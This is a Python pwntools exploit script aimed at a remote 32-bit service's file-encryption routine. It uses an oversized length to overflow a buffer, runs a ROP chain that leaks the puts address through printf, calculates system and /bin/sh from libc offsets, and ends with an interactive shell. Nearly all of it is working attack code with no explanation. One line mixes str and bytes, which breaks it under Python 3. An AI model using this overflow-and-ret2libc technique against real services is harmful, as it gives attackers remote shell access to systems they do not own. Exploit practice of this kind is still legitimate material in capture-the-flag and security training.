from pwn import *
import struct
import sys

def recvall(conn):
	msg = b''
	while True:
		try:
			new_block = conn.recv(timeout=1)
			if new_block == b'':
				break
			msg += new_block	
		except EOFError as e:
			break
	return msg

HOST = sys.argv[1]
PORT = sys.argv[2]
KEYBUF_SIZE = 32
BUFFER_SIZE = 0x20010
BLOCK_SIZE_SEND = 0x200
conn = remote(HOST, PORT)

##########THIS IS THE FIRST PAYLOAD###############
payload = b'E' #Encrypt file option

#############ROP STACK################

ropstack = struct.pack("<I",0x08048930) #redirect to printf@plt
ropstack += struct.pack("<I",0x80497f7) #return to encrypt_file()
ropstack += struct.pack("<I",0x804b3b8) #leak the puts

payload += struct.pack("<I",BUFFER_SIZE+len(ropstack)) #Size of buffer; This is greater than buffer size => exploitable

buffer = b'A' * (BUFFER_SIZE) #This is the buffer content

payload += buffer
payload += ropstack

conn.recvline() #receiving the first printf

log.info("Sending first payload")
log.info("Length of buffer : {} bytes".format(hex(len(buffer))))
log.info("Ropstack Length : {} bytes".format(hex(len(ropstack))))

conn.send(payload)

conn.recvline() #receiving the fake key

msg = recvall(conn)

log.info("Receiving: {} bytes of data".format(hex(len(msg))))
#print(msg)

sz = struct.unpack("<I",msg[:4])[0]
log.info("Return size : {} bytes".format(hex(sz)))

print("="*100)

###########THIS IS THE SECOND PAYLOAD#########

payload = b'E'
payload += struct.pack("<I", sz)
payload += msg[4:]
payload += b'Q'

log.info("Sending second payload")

conn.send(payload)

conn.recvline()

msg = b''
msg = recvall(conn)

puts_addr = struct.unpack("<I",msg[sz+4:sz+8])[0]
log.info("Returned Length : {} bytes".format(hex(len(msg))))
log.info("Puts address : {}".format(hex(puts_addr)))

#print(hex(len(msg)))
#print(msg)

#conn.send(payload)


###########Shell Ropstack#########

bin_sh_address = puts_addr + 0xd852a
system_address = puts_addr - 0x23890

log.info("/bin/sh address : {}".format(hex(bin_sh_address)))
log.info("system address : {}".format(hex(system_address)))

ropstack = struct.pack("<I",system_address)
ropstack += "\xff"*4 #fake address
ropstack += struct.pack("<I", bin_sh_address)

payload = b'E'
payload += struct.pack("<I",BUFFER_SIZE + len(ropstack))
payload += b'A'*BUFFER_SIZE
payload += ropstack

conn.send(payload)

conn.recvline()
msg = recvall(conn)

log.info("Sending Final Payload...")

payload = b'E'
payload += struct.pack("<I",BUFFER_SIZE + len(ropstack))
payload += msg[4:]
payload += b'Q'

conn.send(payload)
conn.recvline()

recvall(conn) #remove this for some cool garbage print before getting a shell ;)

conn.interactive()
conn.close()
